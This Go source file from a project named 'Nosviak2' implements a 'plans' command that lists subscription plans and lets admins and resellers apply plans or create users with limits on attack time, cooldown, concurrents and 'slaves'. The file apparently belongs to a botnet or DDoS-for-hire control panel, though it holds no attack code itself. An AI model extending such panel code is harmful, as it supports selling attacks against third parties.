package commands

import (
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/clients/views/pager"
	deployment "Nosviak2/core/configs"
	"Nosviak2/core/configs/models"
	"Nosviak2/core/database"
	"Nosviak2/core/sources/language"
	"Nosviak2/core/sources/language/lexer"
	"Nosviak2/core/sources/layouts/json"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/ranks"
	"Nosviak2/core/sources/tools"
	"Nosviak2/core/sources/views"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
	"golang.org/x/term"
)

func init() {

	MakeCommand(&Command{
		CommandName:        "plans",
		Aliases:            []string{"plan"},
		CommandPermissions: make([]string, 0),
		CommandDescription: "view all possible plan options",
		CommandFunction: func(s *sessions.Session, cmd []string) error {

			//creates the simpletable
			//this will store our information
			table := simpletable.New() //makes the structure
			//sets table header
			//this will be used to define information
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{ //sets the values properly without issues happening
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "plans", "headers", "name.tfx").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "plans", "headers", "description.tfx").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "plans", "headers", "length.tfx").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "plans", "headers", "access.tfx").Containing, lexer.Escapes)},
				},
			}
			//ranges through every opens ession
			//this will make sure its done without issues
			for name, plan := range toml.Plans.Plans { //ranges through all users sessions
				//creates the store properly without issues
				rk := []*simpletable.Cell{ //fills with the information properly without issues
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "plans", "values", "name.tfx").Containing, lexer.Escapes), "<<$name>>", name)}, 
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "plans", "values", "description.tfx").Containing, lexer.Escapes), "<<$description>>", plan.Description)},
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "plans", "values", "length.tfx").Containing, lexer.Escapes), "<<$length>>", strconv.Itoa(plan.PlanLength))}, 
					{Align: simpletable.AlignLeft, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "plans", "values", "access.tfx").Containing, lexer.Escapes), "<<$ranks>>", strings.Join(ranks.CreateSystem(plan.AccessArrangements), " "))}, 
				}

				//saves into the array correctly
				//this will be properly founded later onwards
				table.Body.Cells = append(table.Body.Cells, rk)
			}

			//renders the clear splash information properly and safely without issues happening on request
			return pager.MakeTable("plans", table, s).TextureTable()
		},

		SubCommands: []SubCommand{
			{
				SubcommandName: "apply",
				Description: "apply a plan preset to a user",
				CommandPermissions: []string{"admin", "moderator", "reseller"},
				CommandSplit: " " ,SubCommandFunction: func(s *sessions.Session, cmd []string) error {

	
					if len(cmd) < 4 { // Checks the syntax information 
						return language.ExecuteLanguage([]string{"commands", "plans", "apply", "syntax.itl"}, s.Channel, deployment.Engine, s, make(map[string]string))
					}

					// Renders the warning information like banner and prompt
					language.ExecuteLanguage([]string{"commands", "plans", "apply", "warning.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
					language.ExecuteLanguage([]string{"commands", "plans", "apply", "prompt.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
					choice, err := term.NewTerminal(s.Channel, "").ReadLine() // Reads the input
					if err != nil {
						return err
					}

					if strings.ToLower(choice) != "y" { // Wrong choice given
						return language.ExecuteLanguage([]string{"commands", "plans", "apply", "closed.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
					}

					Plan := toml.Plans.Plans[cmd[2]]
					if Plan == nil { // Unknown plan has been given inside the arguments
						return language.ExecuteLanguage([]string{"commands", "plans", "apply", "unknown_plan.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
					}


					user, err := database.Conn.FindUser(cmd[3])
					if err != nil || user == nil { // Tries to validate if the user exists
						return language.ExecuteLanguage([]string{"commands", "plans", "apply", "unknown_user.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
					}

					if err := ApplyPlan(Plan, user.Username); err != nil {
						return language.ExecuteLanguage([]string{"commands", "plans", "apply", "eof.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
					}
				

					// Success message for updating the user
					return language.ExecuteLanguage([]string{"commands", "plans", "apply", "success.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":cmd[2], "username":cmd[3]})
				},
			},
			{
				SubcommandName: "create",
				Description: "create a user with a plan",
				CommandPermissions: []string{"admin", "moderator", "reseller"},
				CommandSplit: " ", SubCommandFunction: func(s *sessions.Session, cmd []string) error {
					//stores the order of operations safely
					//this will allow for better handling without issues happening
					var order []string = []string{"plan", "username"}
					
					//stores the values inside a map without issues happening
					//this will make sure its done without errors happening on reqeust
					var args map[string]string = make(map[string]string)

					//ranges through all the args given without issues happening
					//this ensures its done without any errors happening on request
					for pos := 2; pos < len(cmd); pos++ { //loops through all the args
						if pos - 2 >= len(order) { //makes sure we dont ignore without issues
							break //breaks from the loop
						}
						//inserts into the map without issues
						//this will make sure its done without errors happening
						args[order[pos - 2]] = cmd[pos]; continue //and continues looping
					}


					//ranges through the order properly
					//this will ensure its done without errors happening on request
					for setting := range order {
						//this will ensure that the option hasnt been made inside map
						//stops items from repeating without issues taking place on purpose etc
						if _, ok := args[order[setting]]; ok { //checks if the value is true or false
							continue //continues the loop properly
						}
						//tries to correctly deploy the prompt without issues happening
						//this will try to stop without issues happening on request without errors
						if err := language.ExecuteLanguage([]string{"commands", "plans", "create", order[setting]+".itl"}, s.Channel, deployment.Engine, s, make(map[string]string)); err != nil {
							return err //returns the error correctly and properly
						}
						//prepares and tries to take the input with out issues
						//this will make sure when its executed it doesnt cause issues
						value, err := term.NewTerminal(s.Channel, "").ReadLine() //reads the input
						if err != nil { //properly error handles without issues happening on request
							return err //returns the error properly on purpose
						}

						//saves into the value properly
						//this makes sure its done without issues happening
						args[order[setting]] = value //saves into the socket properly
					}

					
					if toml.Plans.Plans[args["plan"]] == nil {
						return language.ExecuteLanguage([]string{"commands", "plans", "create", "unknown_plan.itl"}, s.Channel, deployment.Engine, s, map[string]string{"plan":args["plan"]})
					}

					if user, err := database.Conn.FindUser(args["username"]); err == nil && user != nil {
						return language.ExecuteLanguage([]string{"commands", "plans", "create", "already_user.itl"}, s.Channel, deployment.Engine, s, map[string]string{"username":args["username"]})
					}

					//creates a strong password for the user inside the database
					password := tools.CreateStrongPassword(json.ConfigSettings.Masters.Accounts.PasswordLength) //renders the password to the terminal
					apiKey   := tools.CreateStrongPassword(toml.ApiToml.API.KeyLen) //renders the password to the terminal
					language.ExecuteLanguage([]string{"commands", "plans", "create", "password.itl"}, s.Channel, deployment.Engine, s, map[string]string{"username":args["username"], "plan":args["plan"], "password":password})
					language.ExecuteLanguage([]string{"commands", "plans", "create", "apikey.itl"}, s.Channel, deployment.Engine, s, map[string]string{"username":args["username"], "plan":args["plan"], "apikey":apiKey})
					//grabs the plan properly
					system := toml.Plans.Plans[args["plan"]]
					system_ranks := ranks.MakeRank(args["username"])

					//ranges through all ranks inside the plan
					for _, access := range system.AccessArrangements {
						system_ranks.GiveRank(access)
					}
					
					//converts into string for db
					raw, err := system_ranks.MakeString()
					if err != nil { //err handles the system properly
						return language.ExecuteLanguage([]string{"commands", "plans", "create", "unknown_eof.itl"}, s.Channel, deployment.Engine, s, map[string]string{"username":args["username"], "plan":args["plan"]})
					}
					
					//makes the users properly and safely and ensures its done without
					err = database.Conn.MakeUser(&database.User{Parent: s.User.Identity, Username: args["username"], Password: password, Theme: system.DefaultTheme, MFA_secret: "", Plan: args["plan"], LockedAddress: "", Ranks: raw,MaxTime: system.Maxtime, Cooldown: system.Cooldown, Concurrents: system.Concurrents, MaxSessions: system.MaxSessions, MaxSlaves: system.MaxSlaves,NewUser: system.Newuser, Locked: false, Expiry: time.Now().Add((time.Hour * 24) * time.Duration(system.PlanLength)).Unix(), Token: apiKey})
					if err != nil {
						return language.ExecuteLanguage([]string{"commands", "plans", "create", "error_creating.itl"}, s.Channel, deployment.Engine, s, map[string]string{"username":args["username"], "plan":args["plan"]})
					} else {
						return language.ExecuteLanguage([]string{"commands", "plans", "create", "created.itl"}, s.Channel, deployment.Engine, s, map[string]string{"username":args["username"], "plan":args["plan"]})
					}

				},
			},
		},
	})
}


// ApplyPlan applys the plan onto the user
func ApplyPlan(plan *models.Plan, user string) error {

	var userErr error = nil
	if plan.Newuser {	// NewUser enabled
		userErr = database.Conn.EnableNewUser(user)
	} else {			// NewUser disabled
		userErr = database.Conn.DisableNewUser(user)
	}

	// err handles the error
	if userErr != nil {
		return userErr
	}

	// Edits maxtime
	if err := database.Conn.EditMaxTime(plan.Maxtime, user); err != nil {
		return err
	}

	// Edits cooldown
	if err := database.Conn.EditCooldown(plan.Cooldown, user); err != nil {
		return err
	}

	// Edits max slaves
	if err := database.Conn.EditMaxSlaves(user, plan.MaxSlaves); err != nil {
		return err
	}

	// Edits max concurrents
	if err := database.Conn.EditConcurrents(plan.Concurrents, user); err != nil {
		return err
	}

	// Edits max sessions
	if err := database.Conn.Sessions(user, plan.MaxSessions); err != nil {
		return err
	}

	// Edits theme
	if err := database.Conn.Theme(user, plan.DefaultTheme); err != nil {
		return err
	}

	system_ranks := ranks.MakeRank(user)				// Makes the rank structure
	for _, access := range plan.AccessArrangements {	// Ranges through all given ranks
		system_ranks.GiveRank(access)
	}
	
	//converts into string for db
	raw, err := system_ranks.MakeString()
	if err != nil {
		return err
	}

	// Updates the rank system
	return database.Conn.EditRanks(raw, user)
}